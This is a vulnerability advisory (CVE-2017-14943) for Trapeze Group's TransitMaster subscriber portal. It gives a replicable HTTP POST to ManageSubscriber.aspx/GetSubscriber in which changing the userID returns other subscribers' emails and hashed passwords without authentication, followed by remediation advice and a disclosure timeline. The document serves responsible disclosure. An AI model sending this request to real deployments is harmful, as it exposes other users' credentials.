[+] CVE ID: Pending - CVE-2017-14943
[+] Credits: Brett DeWall aka @xbadbiddyx
[+] Websites: https://github.com/badbiddy
[+] Source: 

Vendor:
==========================
Trapeze Group
http://www.trapezegroup.com/


Product:
===========
TransitMaster
Version: N/A


Vulnerability Type:
==========================
Sensitive Hashed Credential Disclosure


Vulnerability Details:
=====================
When logging into the subscriber account the "TransitMaster" application makes a HTTP POST request with 
the subscriber's unique ID (In this case is a four digit number) to the backend database and retrieves the 
account information - email / encrypted password. Manipulating this HTTP POST request's subscriber ID number 
by an individual number will retrieve account details for other subscribers of the service. This 
request can be performed unauthenticated - only requiring knowledge of the specific HTTP request.


Replication:
=====================

(Account Password Details) Example HTTP POST Request –

POST /ManageSubscriber.aspx/GetSubscriber HTTP/1.1
Host: webwatch.(REDACTED).com
User-Agent: Mozilla/5.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;	charset=utf-8
X-Requested-With: XMLHttpRequest
Referer: http://webwatch.(REDACTED).com/ManageSubscriber.aspx?userID=1026
Content-Length: 16
Cookie: (Redacted)
Connection: close

{'userID': 1026}



(Account Password Details) Example HTTP Response –

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 22 Dec 2016 02:58:11 GMT
Connection: close
Content-Length: 327

{"d":{"ExtensionData":{},"CreateDate":"\/Date(1482375490983)\/","ID":1026,"LastLogin":"\/Date(1482375490983)\/","LastLogout":"\/Date(1482375490983)\/","LastUpdated":"\/Date(1482375490983)\/","LastUpdatedBy":1026,"Name":"test@test.com","Password":"{[\u003c|?:(REDACTED):?|\u003e]}","Status":1}}




Remediation Details:
=====================
Require authentication to access account details. Ensure logged in account cannot view details of other application users.


Timeline:
=====================
2017-09-16 - Issue Reported to Vendor


[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the
information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author
prohibits any malicious use of security related information
or exploits by the author or elsewhere.

badbiddy
